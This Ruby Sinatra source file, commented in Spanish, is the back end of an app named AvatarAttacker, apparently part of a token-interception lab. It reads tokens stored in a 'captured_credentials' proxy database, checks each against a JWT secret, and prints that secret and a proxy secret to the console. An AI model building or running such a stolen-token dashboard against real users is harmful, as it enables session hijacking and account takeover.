# Requerimientos 
require 'sinatra/base'
require 'sinatra/contrib'
require 'sequel'
require 'sqlite3'
require 'dotenv/load'
require 'jwt'
require 'json'

def tokens_data #Definimos un método para cargar los datos del JSON

    data = JSON.load_file(File.join(__dir__, 'tokens.json'))

  puts "wst_secret:" + data["jwt_secret"]
  puts "proxy_secret:" + data["secret"]

  data

end

# Conectamos la db del proxy
ATTACKER_DB = Sequel.connect("sqlite://#{__dir__}/../captured_credentials.db")

JWT_SECRET = tokens_data["jwt_secret"]

class AvatarAttacker < Sinatra::Base 
    set :views,         File.join(__dir__, 'views')
    set :public_folder, File.join(__dir__, 'public')
    set :static,        true 

        #GET para los tokens capturados
        get "/" do
            #Traemos los registros de la BD por fechas
            @credentials = ATTACKER_DB[:captured_credentials].reverse(:captured_at).all

            #Intentamos decodificar el token
            @decoded = @credentials.map do |cred|
                begin
                    #JWT.decode devuelve [payload, header] — nos interesa el payload
                    payload = JWT.decode(cred[:token], JWT_SECRET, true, { algorithms: ['HS256'] }).first
                    { cred: cred, payload: payload, valid: true }
                rescue JWT::DecodeError => e
                    { cred: cred, payload: nil, valid: false }
                end
            end

            erb :dashboard
        end
end 

